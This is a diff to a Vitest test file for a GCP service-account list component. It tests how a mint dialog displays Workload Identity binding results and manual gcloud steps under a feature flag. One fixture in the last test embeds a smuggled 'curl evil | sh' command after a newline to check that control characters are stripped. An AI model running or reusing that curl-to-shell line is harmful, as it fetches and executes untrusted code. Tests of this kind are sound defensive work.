@@ -37,6 +37,7 @@
 
 import { describe, it, expect, vi, beforeAll, afterEach } from 'vitest';
 import { requestUrl } from '../../client/__fixtures__/request-url.js';
+import { resetServerFlagStateForTests, setFeatureFlag } from '../../utils/feature-flags.js';
 import type { ScionGCPServiceAccountList } from './gcp-service-account-list.js';
 
 interface FetchCall {
@@ -133,6 +134,8 @@ describe('scion-gcp-service-account-list', () => {
 
   afterEach(() => {
     document.body.innerHTML = '';
+    delete window.__SCION_FEATURES__;
+    resetServerFlagStateForTests();
     vi.restoreAllMocks();
   });
 
@@ -486,6 +489,201 @@ describe('scion-gcp-service-account-list', () => {
         '/settings/service-accounts/sa-p?project=proj-1'
       );
       expect(projectLink!.textContent).toContain('one@gcp-project-xyz');
+    });
+  });
+
+  describe('mint dialog Workload Identity binding lines (hub.k8s_workload_identity_setup)', () => {
+    const sampleBindings = [
+      {
+        pool: 'cluster-p.svc.id.goog',
+        namespace: 'agents',
+        ksa: 'scion-wi',
+        member: 'serviceAccount:cluster-p.svc.id.goog[agents/scion-wi]',
+        profiles: ['broker-a/gke-prod'],
+        state: 'bound',
+      },
+      {
+        profiles: ['broker-b/gke-dev'],
+        state: 'skipped',
+        reason: 'no_workload_identity_pool',
+        detail:
+          'no workload_identity_pool is configured for these Kubernetes runtime targets on the Runtime Broker',
+        manualStep:
+          "gcloud iam service-accounts add-iam-policy-binding 'scion-wi@hub.iam.gserviceaccount.com' --role roles/iam.workloadIdentityUser --member 'serviceAccount:<CLUSTER_PROJECT>.svc.id.goog[<NAMESPACE>/scion-wi]'",
+      },
+      {
+        pool: 'bad-p.svc.id.goog',
+        namespace: 'agents',
+        ksa: 'scion-wi',
+        member: 'serviceAccount:bad-p.svc.id.goog[agents/scion-wi]',
+        profiles: ['broker-c/gke'],
+        state: 'failed',
+        reason: 'iam_error',
+        detail: 'the IAM policy update failed: backend error',
+        manualStep:
+          "gcloud iam service-accounts add-iam-policy-binding 'scion-wi@hub.iam.gserviceaccount.com' --role roles/iam.workloadIdentityUser --member 'serviceAccount:bad-p.svc.id.goog[agents/scion-wi]'",
+      },
+    ];
+
+    function makeMintFetch(calls: FetchCall[], mintResponse: Record<string, unknown>) {
+      return (url: string | URL | Request, init?: RequestInit): Promise<Response> => {
+        const u = requestUrl(url);
+        const method = init?.method ?? 'GET';
+        calls.push({ url: u, method });
+        if (method === 'POST' && u.includes('/mint')) {
+          return Promise.resolve(
+            new Response(JSON.stringify(mintResponse), {
+              status: 201,
+              headers: { 'Content-Type': 'application/json' },
+            })
+          );
+        }
+        return Promise.resolve(
+          new Response(
+            JSON.stringify({ items: [], _capabilities: { actions: ['create', 'mint'] } }),
+            { status: 200, headers: { 'Content-Type': 'application/json' } }
+          )
+        );
+      };
+    }
+
+    function mintDialog(el: HTMLElement): Element {
+      const dialog = el.shadowRoot!.querySelector('sl-dialog[label="Mint GCP Service Account"]');
+      expect(dialog).not.toBeNull();
+      return dialog!;
+    }
+
+    it.each([
+      {
+        scope: 'project',
+        scopeId: 'proj-1',
+        expectedMintUrl: '/api/v1/projects/proj-1/gcp-service-accounts/mint',
+      },
+      { scope: 'hub', scopeId: '', expectedMintUrl: '/api/v1/gcp-service-accounts/mint?scope=hub' },
+    ])(
+      'shows one line per binding entry when the experiment is on ($scope scope) and hides them when off',
+      async ({ scope, scopeId, expectedMintUrl }) => {
+        const minted = account({
+          id: 'sa-minted',
+          email: 'scion-wi@hub.iam.gserviceaccount.com',
+          scope,
+          scopeId: scopeId || 'hub',
+          managed: true,
+          workloadIdentityBindings: sampleBindings,
+        });
+
+        // Positive control: experiment ON -> dialog stays open with binding lines.
+        setFeatureFlag('hub.k8s_workload_identity_setup', true);
+        const onCalls: FetchCall[] = [];
+        const attrs: Record<string, string> = { scope };
+        if (scopeId) attrs.scopeId = scopeId;
+        const onEl = await createComponent(attrs, makeMintFetch(onCalls, minted));
+
+        const events: unknown[] = [];
+        onEl.addEventListener('sa-list-changed', (e) => events.push((e as CustomEvent).detail));
+
+        (onEl as unknown as { openMintDialog: () => void }).openMintDialog();
+        await settle(onEl);
+        expect(mintDialog(onEl).hasAttribute('open')).toBe(true);
+
+        await (onEl as unknown as { handleMint: (e: Event) => Promise<void> }).handleMint(
+          new Event('submit')
+        );
+        await settle(onEl);
+
+        const post = onCalls.find((c) => c.method === 'POST');
+        expect(post?.url).toBe(expectedMintUrl);
+        expect(events).toHaveLength(1);
+
+        const openAfterMint = mintDialog(onEl);
+        expect(openAfterMint.hasAttribute('open')).toBe(true);
+        expect(openAfterMint.querySelectorAll('.wi-binding-item').length).toBe(3);
+
+        const dialogText = openAfterMint.textContent ?? '';
+        expect(dialogText).toContain('Workload Identity bindings');
+        expect(dialogText).toContain('serviceAccount:cluster-p.svc.id.goog[agents/scion-wi]');
+        expect(dialogText).toContain('broker-a/gke-prod');
+        expect(dialogText).toContain('no_workload_identity_pool');
+        expect(dialogText).toContain('broker-b/gke-dev');
+        expect(dialogText).toContain('iam_error');
+        expect(dialogText).toContain(
+          "gcloud iam service-accounts add-iam-policy-binding 'scion-wi@hub.iam.gserviceaccount.com'"
+        );
+        expect(dialogText).toContain('take a few minutes to take effect');
+
+        // Closing via Done and re-opening resets back to the mint form.
+        (onEl as unknown as { closeMintDialog: () => void }).closeMintDialog();
+        await settle(onEl);
+        expect(mintDialog(onEl).hasAttribute('open')).toBe(false);
+
+        (onEl as unknown as { openMintDialog: () => void }).openMintDialog();
+        await settle(onEl);
+        expect(mintDialog(onEl).querySelectorAll('.wi-binding-item').length).toBe(0);
+
+        // Negative control: experiment OFF -> dialog closes immediately and renders no binding lines.
+        setFeatureFlag('hub.k8s_workload_identity_setup', false);
+        const offEl = await createComponent(attrs, makeMintFetch([], minted));
+        (offEl as unknown as { openMintDialog: () => void }).openMintDialog();
+        await settle(offEl);
+        await (offEl as unknown as { handleMint: (e: Event) => Promise<void> }).handleMint(
+          new Event('submit')
+        );
+        await settle(offEl);
+
+        expect(mintDialog(offEl).hasAttribute('open')).toBe(false);
+        expect(mintDialog(offEl).querySelectorAll('.wi-binding-item').length).toBe(0);
+      }
+    );
+
+    it('closes the mint dialog immediately when the experiment is on but no Kubernetes targets were reported', async () => {
+      setFeatureFlag('hub.k8s_workload_identity_setup', true);
+      const minted = account({
+        id: 'sa-minted',
+        email: 'scion-docker@hub.iam.gserviceaccount.com',
+        managed: true,
+      });
+      const el = await createComponent({ scope: 'hub' }, makeMintFetch([], minted));
+
+      (el as unknown as { openMintDialog: () => void }).openMintDialog();
+      await settle(el);
+      await (el as unknown as { handleMint: (e: Event) => Promise<void> }).handleMint(
+        new Event('submit')
+      );
+      await settle(el);
+
+      expect(mintDialog(el).hasAttribute('open')).toBe(false);
+    });
+
+    it('replaces control characters in binding details and manual steps with spaces', async () => {
+      setFeatureFlag('hub.k8s_workload_identity_setup', true);
+      const minted = account({
+        id: 'sa-minted',
+        email: 'scion-wi@hub.iam.gserviceaccount.com',
+        managed: true,
+        workloadIdentityBindings: [
+          {
+            profiles: ['broker-b/gke'],
+            state: 'failed',
+            reason: 'iam_error',
+            detail: 'bad\nsecond-line',
+            manualStep: 'gcloud iam ...\ncurl evil | sh',
+          },
+        ],
+      });
+      const el = await createComponent({ scope: 'hub' }, makeMintFetch([], minted));
+
+      (el as unknown as { openMintDialog: () => void }).openMintDialog();
+      await settle(el);
+      await (el as unknown as { handleMint: (e: Event) => Promise<void> }).handleMint(
+        new Event('submit')
+      );
+      await settle(el);
+
+      const cmdEl = mintDialog(el).querySelector('.gcloud-command');
+      expect(cmdEl).not.toBeNull();
+      expect(cmdEl!.textContent).not.toContain('\n');
+      expect(cmdEl!.textContent).toContain('gcloud iam ... curl evil | sh');
+      expect(mintDialog(el).textContent).not.toContain('take a few minutes to take effect');
     });
   });
 });
